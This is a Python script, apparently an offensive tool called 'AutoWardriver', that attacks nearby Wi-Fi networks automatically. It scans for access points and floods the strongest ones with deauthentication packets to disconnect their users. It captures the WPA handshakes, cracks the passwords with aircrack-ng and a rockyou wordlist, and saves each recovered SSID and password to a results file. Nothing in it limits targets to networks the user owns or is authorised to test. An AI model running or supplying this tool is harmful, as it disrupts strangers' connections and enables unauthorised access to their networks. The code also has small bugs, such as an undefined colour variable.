#!/usr/bin/env python3
import subprocess
import threading
import time
import os
import sys
import csv
import re
import signal
from datetime import datetime
from collections import deque
from scapy.all import sniff, EAPOL, Dot11

# Configuration
SCAN_DURATION = 15
HANDSHAKE_TIMEOUT = 60
DEAUTH_INTERVAL = 2
MAX_PROCESSED = 50
WORDLIST = "/usr/share/wordlists/rockyou.txt"
CONCURRENT_ATTACKS = 2
MIN_SIGNAL_STRENGTH = -95

# Colors
GREEN, RED, BLUE, YELLOW, CYAN, RESET = "\033[92m", "\033[91m", "\033[94m", "\033[93m", "\033[96m", "\033[0m"

def banner():
    os.system("clear")
    print(f"""{BOLD}{GREEN}


  (`\ .-') /`                               _   .-')       ('-.            .-') _                (`\ .-') /`,---.,---.
   `.( OO ),'                              ( '.( OO )_   _(  OO)          ( OO ) )                `.( OO ),'|   ||   |
,--./  .--.  ,-.-')    ,------.,-.-')       ,--.   ,--.)(,------.     ,--./ ,--,'  .-'),-----. ,--./  .--.  |   ||   |
|      |  |  |  |OO)('-| _.---'|  |OO)      |   `.'   |  |  .---'     |   \ |  |\ ( OO'  .-.  '|      |  |  |   ||   |
|  |   |  |, |  |  \(OO|(_\    |  |  \      |         |  |  |         |    \|  | )/   |  | |  ||  |   |  |, |   ||   |
|  |.'.|  |_)|  |(_//  |  '--. |  |(_/      |  |'.'|  | (|  '--.      |  .     |/ \_) |  |\|  ||  |.'.|  |_)|  .'|  .'
|         | ,|  |_.'\_)|  .--',|  |_.'      |  |   |  |  |  .--'      |  |\    |    \ |  | |  ||         |  `--' `--' 
|   ,'.   |(_|  |     \|  |_)(_|  |         |  |   |  |  |  `---.     |  | \   |     `'  '-'  '|   ,'.   |  .--. .--. 
'--'   '--'  `--'      `--'    `--'         `--'   `--'  `------'     `--'  `--'       `-----' '--'   '--'  '--' '--' 


{CYAN}               >>>   WIFI ME NOW | 369 Project   <<<{RESET}
""")


class AutoWardriver:
    def __init__(self, interface):
        self.interface = interface
        self.mon_iface = None
        self.processed = deque(maxlen=MAX_PROCESSED)
        self.running = True
        self.lock = threading.Lock()
        self.active_attacks = []

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.check_dependencies()
        self.mon_iface = self.start_monitor_mode()

    def check_dependencies(self):
        required = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "iwconfig"]
        for cmd in required:
            if subprocess.call(f"which {cmd} >/dev/null 2>&1", shell=True) != 0:
                self.log(f"Missing required tool: {cmd}", RED)
                sys.exit(1)

    def log(self, msg, color=RESET):
        print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}{RESET}")

    def start_monitor_mode(self):
        self.log("Starting monitor mode...", BLUE)
        subprocess.run("sudo airmon-ng check kill >/dev/null 2>&1", shell=True)
        subprocess.run(f"sudo airmon-ng start {self.interface} >/dev/null 2>&1", shell=True)
        return f"{self.interface}" if not self.interface.endswith("mon") else self.interface

    def scan_networks(self):
        self.log("Scanning for networks...", CYAN)
        csv_file = f"scan_{time.time()}"
        
        airodump = subprocess.Popen(
            ["sudo", "airodump-ng", "-w", csv_file, "--output-format", "csv", self.mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        time.sleep(SCAN_DURATION)
        airodump.terminate()
        try:
            airodump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump.kill()

        aps = self.parse_airodump_csv(f"{csv_file}-01.csv")
        try:
            os.remove(f"{csv_file}-01.csv")
        except:
            pass
        return aps

    def parse_airodump_csv(self, filename):
        aps = []
        try:
            with open(filename, 'r', encoding='latin-1') as f:
                reader = csv.reader(f)
                ap_section = False
                
                for row in reader:
                    if not any(row):
                        ap_section = False
                        continue
                    
                    if row[0].strip().startswith("BSSID"):
                        ap_section = True
                        continue
                    
                    if ap_section and len(row) >= 14:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        try:
                            power = int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else -100
                        except:
                            power = -100
                        ssid = row[13].strip() if len(row) > 13 else '<hidden>'
                        
                        if bssid and channel:
                            aps.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'ssid': ssid if ssid else '<hidden>'
                            })
        except Exception as e:
            self.log(f"CSV parsing error: {str(e)}", RED)
        return aps

    def set_channel(self, channel):
        subprocess.run(f"sudo iwconfig {self.mon_iface} channel {channel}", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def capture_handshake(self, target):
        self.log(f"Targeting {target['ssid']} ({target['bssid']}) - Channel {target['channel']}, Power {target['power']}", YELLOW)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capname = f"{target['bssid'].replace(':','')}_{timestamp}"
        cap_path = f"captures/{capname}"
        
        os.makedirs("captures", exist_ok=True)
        self.set_channel(target['channel'])

        # Start airodump in background
        airodump = subprocess.Popen([
            "sudo", "airodump-ng", "-c", target['channel'], 
            "--bssid", target['bssid'], "-w", cap_path, self.mon_iface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Start handshake detection
        eapol_messages = set()
        handshake_found = threading.Event()
        
        def eapol_sniffer(packet):
            if packet.haslayer(EAPOL):
                eapol_messages.add(len(packet))
                self.log(f"Detected EAPOL frame ({len(eapol_messages)}/4)", YELLOW)
                if len(eapol_messages) >= 2:
                    handshake_found.set()

        sniffer_thread = threading.Thread(
            target=sniff, 
            kwargs={"iface": self.mon_iface, "prn": eapol_sniffer, "timeout": HANDSHAKE_TIMEOUT}
        )
        sniffer_thread.start()

        # Start deauth
        deauth = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "8", "-a", target['bssid'], self.mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # Wait for handshake or timeout
        sniffer_thread.join()
        
        # Clean up
        deauth.terminate()
        airodump.terminate()
        try:
            deauth.wait(timeout=3)
            airodump.wait(timeout=3)
        except:
            pass

        if handshake_found.is_set():
            self.log(f"Handshake captured for {target['ssid']}", GREEN)
            final_cap = f"{cap_path}-01.cap"
            self.log(f"Capture saved to: {final_cap}", GREEN)
            self.crack_password(cap_path, target)
            with self.lock:
                self.processed.append(target['bssid'])
        else:
            self.log(f"No handshake detected for {target['ssid']}", RED)

    def crack_password(self, cap_path, target):
        self.log(f"Cracking {target['ssid']} with {WORDLIST}...", CYAN)
        
        result = subprocess.run(
            ["aircrack-ng", f"{cap_path}-01.cap", "-w", WORDLIST],
            capture_output=True, text=True
        )
        
        output = result.stdout
        password = None
        for line in output.splitlines():
            if "KEY FOUND!" in line:
                password = line.split(":")[-1].strip()
                break

        if password:
            self.log(f"Password found: {password}", GREEN)
            self.save_result(target, password, f"{cap_path}-01.cap")
        else:
            self.log("Password not found in wordlist", RED)

    def save_result(self, target, password, cap_file):
        os.makedirs("results", exist_ok=True)
        file_path = os.path.join("results", "results.csv")
        exists = os.path.isfile(file_path)

        with open(file_path, "a", newline="") as f:
            writer = csv.writer(f)
            if not exists:
                writer.writerow(["Timestamp", "SSID", "BSSID", "Password", "Capture File"])
            writer.writerow([
                datetime.now().isoformat(),
                target['ssid'],
                target['bssid'],
                password,
                cap_file
            ])

    def signal_handler(self, sig, frame):
        self.log("Shutting down...", RED)
        self.running = False
        subprocess.run(f"sudo airmon-ng stop {self.mon_iface} >/dev/null 2>&1", shell=True)
        subprocess.run("sudo systemctl restart NetworkManager >/dev/null 2>&1", shell=True)
        sys.exit(0)

    def run(self):
        os.makedirs("captures", exist_ok=True)
        self.log(f"Starting AutoWardriver on {self.mon_iface}", GREEN)
        
        while self.running:
            targets = self.scan_networks()
            
            if not targets:
                self.log("No networks found, rescanning...", BLUE)
                time.sleep(5)
                continue

            # Filter targets
            fresh_targets = [
                t for t in targets 
                if t['bssid'] not in self.processed 
                and t['power'] > MIN_SIGNAL_STRENGTH
            ]
            
            if not fresh_targets:
                self.log("No viable new networks found, rescanning...", BLUE)
                time.sleep(5)
                continue

            self.log(f"Found {len(fresh_targets)} viable networks, attacking top {CONCURRENT_ATTACKS}", CYAN)
            threads = []
            
            for target in fresh_targets[:CONCURRENT_ATTACKS]:
                if not self.running:
                    break
                
                t = threading.Thread(target=self.capture_handshake, args=(target,))
                t.start()
                threads.append(t)
                time.sleep(1)

            for t in threads:
                t.join()

if __name__ == "__main__":
    banner()
    if os.geteuid() != 0:
        print(f"{RED}Must be run as root!{RESET}")
        sys.exit(1)

    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <interface>")
        sys.exit(1)

    driver = AutoWardriver(sys.argv[1])
    driver.run()
